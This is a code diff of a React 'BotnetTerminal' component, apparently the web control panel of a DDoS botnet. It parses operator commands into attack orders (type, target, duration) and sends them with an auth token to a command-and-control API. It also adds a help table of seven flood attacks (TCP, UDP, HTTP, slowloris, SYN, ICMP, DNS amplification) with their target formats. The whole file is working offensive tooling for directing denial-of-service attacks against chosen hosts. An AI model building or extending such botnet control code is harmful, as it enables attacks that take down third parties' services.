@@ -54,46 +54,51 @@ export const BotnetTerminal = () => {
 
   const customCommand = async (command) => {
 
+    let response=""
     const array_cmd = command.split(" ")
     
     let body={};
     switch(array_cmd.length){
       case 1:
+        if(array_cmd[0] != 'stop_attack') return;
+        response = "Attacks stopped"
         body=JSON.stringify({stop_attack:''}) 
-        console.log(body);
         break;
-        case 3:
-          console.log(body);
-          const [ type, target, duration] = array_cmd;
-          const attack={
-            type,
-            target,
-            duration
-          };
-          
-          body=JSON.stringify({attack}) 
-          break;
+
+      case 3:
+        const [ type, target, duration] = array_cmd;
+        const attack={
+          type,
+          target,
+          duration
+        };
+        
+        response = `Attack ${type} has been started, target [ ${target} ]`
+
+        body=JSON.stringify({attack}) 
+        break;
 
     }
 
     try {
-      const response = await fetch(`http://localhost:4000/api/rcv/cpanel/all`, {
+      const requests = await fetch(`http://localhost:4000/api/rcv/cpanel/all`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json', 'x-token':`${Cookies.get('x-token')}`},
         body: body
       });
 
-      if (!response.ok) throw new Error(`Error del servidor: ${response.status}`);
+      if (!requests.ok) throw new Error(`Error del servidor: ${requests.status}`);
       
-      const data = await response.json();
+      const data = await requests.json();
 
       if (data.msg === "Autenticación inválida") {
         alert("Autenticación inválida");
         startLogOut();
       }
-      return data;
+      return response;
+
     } catch (error) {
-      console.error('Error en customCommand:', error);
+      //console.error('Error en customCommand:', error);
       return { result: 'Hubo un error ejecutando el comando.' };
     }
   };
@@ -121,19 +126,23 @@ export const BotnetTerminal = () => {
       case 'attacks':
 
         response = `
-          tcp_flood <target> <duration>
-          udp_flood <target> <duration>
-          http_flood <target> <duration>
-          slowloris <target> <duration>
-          syn_flood <target> <duration>
-          icmp_flood <target> <duration>
-          dns_amplification <target> <duration>
+          _______________________________________________________________
+          |__Arg 1__|_____________|______Arg2____|____________|___Arg3__|
+        
+          tcp_flood              <target_ip:port>           <duration>         (NO http/https)
+          udp_flood              <target_ip:port>           <duration>         (NO http/https)
+          http_flood             <http://host:port>         <duration>
+          slowloris              <target_ip:port>           <duration>         (NO http/https)
+          syn_flood              <target_ip:port>           <duration>         (NO http/https)
+          icmp_flood             <target_ip:port>           <duration>         (NO http/https)
+          dns_amplification      <target_ip:port>           <duration>         (NO http/https)
         `;
         break;
         
       default: {
         const data = await customCommand(command);
-        
+        response = data;
+        break;
         //response = data.result;
         //break;
       }
